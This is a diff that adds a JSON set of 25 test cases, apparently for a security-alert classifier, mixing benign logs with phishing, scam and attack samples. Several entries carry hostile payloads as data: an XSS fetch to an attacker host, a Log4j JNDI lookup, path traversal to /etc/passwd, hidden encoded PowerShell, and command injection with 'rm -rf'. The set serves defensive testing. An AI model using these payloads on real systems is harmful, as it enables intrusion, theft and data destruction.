@@ -1,0 +1,152 @@
+[
+  {
+    "id": "case_01",
+    "type": "malicious_log",
+    "description": "SSH Brute-Force Attack Log",
+    "raw_input": "Oct  5 12:00:23 secure-server sshd: Failed password for invalid user admin from 198.51.100.42 port 49152 ssh2\nOct  5 12:00:25 secure-server sshd: Failed password for invalid user admin from 198.51.100.42 port 49156 ssh2\nOct  5 12:00:28 secure-server sshd: Failed password for root from 198.51.100.42 port 49160 ssh2"
+  },
+  {
+    "id": "case_02",
+    "type": "phishing",
+    "description": "Urgent Corporate Phishing Email",
+    "raw_input": "From: IT Support <security-alert-microsoft@secure-login-update-service.com>\nSubject: ACTION REQUIRED: Your corporate account password expires in 2 hours!\n\nDear Employee,\nClick the secure IT portal link below to update your password:\nhttp://portal-auth-check.xyz"
+  },
+  {
+    "id": "case_03",
+    "type": "benign_log",
+    "description": "Normal System Database Backup Log",
+    "raw_input": "[2026-10-05 12:10:00] INFO: CronJobManager - Starting scheduled database backup.\n[2026-10-05 12:11:03] INFO: CronJobManager - Scheduled database backup completed cleanly."
+  },
+  {
+    "id": "case_04",
+    "type": "edge_case_empty",
+    "description": "Blank Submission",
+    "raw_input": ""
+  },
+  {
+    "id": "case_05",
+    "type": "edge_case_gibberish",
+    "description": "Random Non-Security Text",
+    "raw_input": "Hey what time are we meeting for lunch today? Let me know if you want tacos or pizza. Also don't forget to bring the chargers."
+  },
+  {
+    "id": "case_06",
+    "type": "malicious_web_log",
+    "description": "SQL Injection Attack on a Web Form",
+    "raw_input": "192.168.1.105 - - [05/Oct/2026:12:34:56] \"POST /login.php HTTP/1.1\" 200 4500\n192.168.1.105 - - [05/Oct/2026:12:35:02] \"POST /login.php?user=admin'%20OR%20'1'='1 -- HTTP/1.1\" 200 8900"
+  },
+  {
+    "id": "case_07",
+    "type": "ransomware_note",
+    "description": "Text from a Ransomware Infection",
+    "raw_input": "!!! ALL YOUR FILES ARE ENCRYPTED !!!\nTo restore your data, you must pay 0.5 Bitcoin to the wallet address below within 48 hours. If you fail to pay, all your corporate files will be leaked to the public internet.\nContact us at: recovery-help@onion-mail.top"
+  },
+  {
+    "id": "case_08",
+    "type": "stress_test_wall_of_text",
+    "description": "Massive Repeated Log Dump",
+    "raw_input": "[INFO] 12:40:01 Safe log\n[WARN] 12:40:03 Failed login from 203.0.113.5\n[REPEATED 2000 TIMES TO OVERLOAD TO TEST FRONTEND RESPONSIVENESS AND AI TOKEN LIMIT HANDLING WITHOUT CRASHING]"
+  },
+  {
+    "id": "case_09",
+    "type": "advanced_social_engineering",
+    "description": "Executive Impersonation (Whaling via Slack/Teams)",
+    "raw_input": "CEO [12:42:15]: Hey, I'm currently stuck in a critical board meeting and my corporate card just got declined. I need you to immediately buy 5 x $200 Apple gift cards for this client priority reward. Text the serial numbers directly to my personal cell at +1 (555) 019-2834. Do not call me, I cannot pick up right now. Super urgent, thanks."
+  },
+  {
+    "id": "case_10",
+    "type": "cloud_infrastructure_threat",
+    "description": "AWS CloudTrail Malicious Credential Exfiltration",
+    "raw_input": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": { \"type\": \"AssumedRole\", \"principalId\": \"AROAWSAMPLE:attacker-session\" },\n  \"eventName\": \"ConsoleLogin\",\n  \"eventSource\": \"://amazonaws.com\",\n  \"sourceIPAddress\": \"198.51.100.99\",\n  \"errorMessage\": \"Failed authentication\",\n  \"additionalEventData\": { \"MFAUsed\": \"No\" }\n}"
+  },
+  {
+    "id": "case_11",
+    "type": "malicious_web_log",
+    "description": "Cross-Site Scripting (XSS) Input payload",
+    "raw_input": "10.0.0.45 - - [05/Oct/2026:14:10:22] \"GET /search?q=<script>fetch('http://attacker.xyz)</script> HTTP/1.1\" 200 3120"
+  },
+  {
+    "id": "case_12",
+    "type": "malicious_log",
+    "description": "Linux Password File Tampering (/etc/passwd read attempt)",
+    "raw_input": "192.168.50.12 - - [05/Oct/2026:14:15:00] \"GET /../../../../etc/passwd HTTP/1.1\" 400 230 \"Mozilla/5.0\" [Directory Traversal Attempt]"
+  },
+  {
+    "id": "case_13",
+    "type": "insider_threat",
+    "description": "Mass Data Exfiltration Log",
+    "raw_input": "2026-10-05T14:22:10Z SFTP-Server[4521]: User 'jdoe' downloaded 'q4_financial_unreleased.xlsx' (450MB) from directory /shares/confidential/ via external IP 185.220.101.5"
+  },
+  {
+    "id": "case_14",
+    "type": "phishing",
+    "description": "Smishing (SMS Phishing Link)",
+    "raw_input": "[USPS ALERT] Your package could not be delivered due to an incorrect address. Please update your delivery preferences within 12 hours here: http://usps-tracking-package-redirection.top"
+  },
+  {
+    "id": "case_15",
+    "type": "malicious_log",
+    "description": "Active Directory Kerberoasting Attack alert",
+    "raw_input": "EventCode: 4769\nTaskCategory: Kerberos Service Ticket Operations\nTargetUserName: Administrator@CORP.LOCAL\nIpAddress: 192.168.10.88\nTicketEncryptionType: 0x17 (RC4-HMAC - Highly Vulnerable to Crack attempts)"
+  },
+  {
+    "id": "case_16",
+    "type": "benign_log",
+    "description": "Normal Automated Network Health Check Ping",
+    "raw_input": "ping -c 4 8.8.8.8\nPING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=12.4 ms\n--- 8.8.8.8 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3004ms"
+  },
+  {
+    "id": "case_17",
+    "type": "compliance_violation",
+    "description": "Plaintext Credit Card Storage Leak",
+    "raw_input": "[2026-10-05 14:35:12] DEBUG PaymentProcessor - Logging transaction dump: { user: 'asmith', cc_number: '4111 2222 3333 4444', cvv: '123', exp: '12/29', status: 'pending' }"
+  },
+  {
+    "id": "case_18",
+    "type": "malicious_log",
+    "description": "Cryptomining Process Detection Log",
+    "raw_input": "root@prod-node-01:~# ps aux | grep minergate\nroot  9912  98.4  2.1  240512  42100 ?  Ssl  14:02  32:15 ./minergate-cli --user attacker@mail.com --xmr"
+  },
+  {
+    "id": "case_19",
+    "type": "advanced_social_engineering",
+    "description": "Phishing via Technical MFA Fatigue/Bypass Note",
+    "raw_input": "From: Corporate IT Helpdesk <helpdesk@corporate-mfa-verification.com>\nSubject: Action Required: Confirm unusual multi-factor auth request\n\nWe detected 15 denied authentication prompts on your Authenticator App. Please approve the next incoming push notice to sync your server clock and silence these warnings."
+  },
+  {
+    "id": "case_20",
+    "type": "malicious_web_log",
+    "description": "Log4j Remote Code Execution (RCE) string patterns",
+    "raw_input": "192.168.1.200 - - [05/Oct/2026:14:45:10] \"GET / HTTP/1.1\" 400 150 \"${jndi:ldap://malicious-jndi-server.xyz:1389/Exploit}\""
+  },
+  {
+    "id": "case_21",
+    "type": "malicious_log",
+    "description": "Windows Defender Trojan Malware Quarantine Event",
+    "raw_input": "LogName=Microsoft-Windows-Windows Defender/Operational\nEventCode=1116\nSeverity=CRITICAL\nDescription=Windows Defender Antivirus has detected malware. Name: Trojan:Win32/Mimikatz.A!credential_stealer Path: file:C:\\Users\\Public\\Downloads\\mimikatz.exe"
+  },
+  {
+    "id": "case_22",
+    "type": "edge_case_gibberish",
+    "description": "Base64 Obfuscated Attack Code (Decoder test)",
+    "raw_input": "powershell.exe -nop -w hidden -e aWxsZWdhbCBhY3Rpdml0eSBkZXRlY3Rpb24gcGF5bG9hZCBleGVjdXRpb24gc3RhcnRpbmc="
+  },
+  {
+    "id": "case_23",
+    "type": "benign_log",
+    "description": "Routine Git Corporate Push History",
+    "raw_input": "commit b3f7c11d73a6c49b7f348ecb72533b1c6e84665cf\nAuthor: Dev Lead <dev@company.com>\nDate:   Mon Oct 5 14:50:00 2026\n\n    Refactor frontend dashboard layout and add oxlint hooks [200 OK]"
+  },
+  {
+    "id": "case_24",
+    "type": "insider_threat",
+    "description": "Unauthorized API Token Cleansing / Creation Log",
+    "raw_input": "[2026-10-05 15:01:12] WARN AuthAPI: User 'temp_contractor' generated a root-level master API token bypass key with no expiration date from dynamic proxy IP 45.223.10.11"
+  },
+  {
+    "id": "case_25",
+    "type": "malicious_web_log",
+    "description": "Command Injection via Web Parameter Vector",
+    "raw_input": "192.168.99.12 - - [05/Oct/2026:15:10:00] \"POST /network_diagnostic.php HTTP/1.1\" 200 450 \"target_ip=127.0.0.1; cat /etc/resolv.conf; rm -rf /tmp/*\""
+  }
+]
